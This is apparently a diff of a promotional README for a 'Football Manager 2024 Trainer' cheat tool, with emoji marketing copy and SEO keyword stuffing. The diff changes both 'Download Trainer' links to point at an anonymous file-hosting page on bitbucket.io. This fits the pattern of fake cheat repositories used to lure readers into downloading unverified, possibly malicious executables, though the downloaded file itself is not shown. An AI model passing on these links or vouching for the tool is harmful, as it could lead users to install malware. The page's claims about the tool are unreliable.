@@ -4,7 +4,7 @@
 
 Whether you're rebuilding a fallen giant or dominating lower leagues, this trainer gives you the power to manage like a true football god. 💼🔥
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/football-manager-2024/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload10.bitbucket.io)
 ---
 
 ## 🧠 What Is a Football Manager 2024 Trainer?
@@ -19,7 +19,7 @@ It's perfect for:
 * Speedrunning trophies
 * Exploring “what-if” football fantasies
 
-[![Download Trainer](https://www.turkmmo.com/wp-content/uploads/2023/11/fm-24-game-editor.jpg)](https://wecheaters.github.io/cheats/football-manager-2024/)
+[![Download Trainer](https://www.turkmmo.com/wp-content/uploads/2023/11/fm-24-game-editor.jpg)](https://fileoffload10.bitbucket.io)
 ---
 
 ## 🔥 Top Features of the FM24 Trainer
@@ -104,3 +104,4 @@ football manager 2024 trainer, fm24 cheat tool, fm24 budget hack, fm24 attribute
 
 **No rebuilds. No injuries. No stress.**
 With a **Football Manager 2024 Trainer**, you're not just managing — you're rewriting football history on your terms. 🏆⚽💼
+
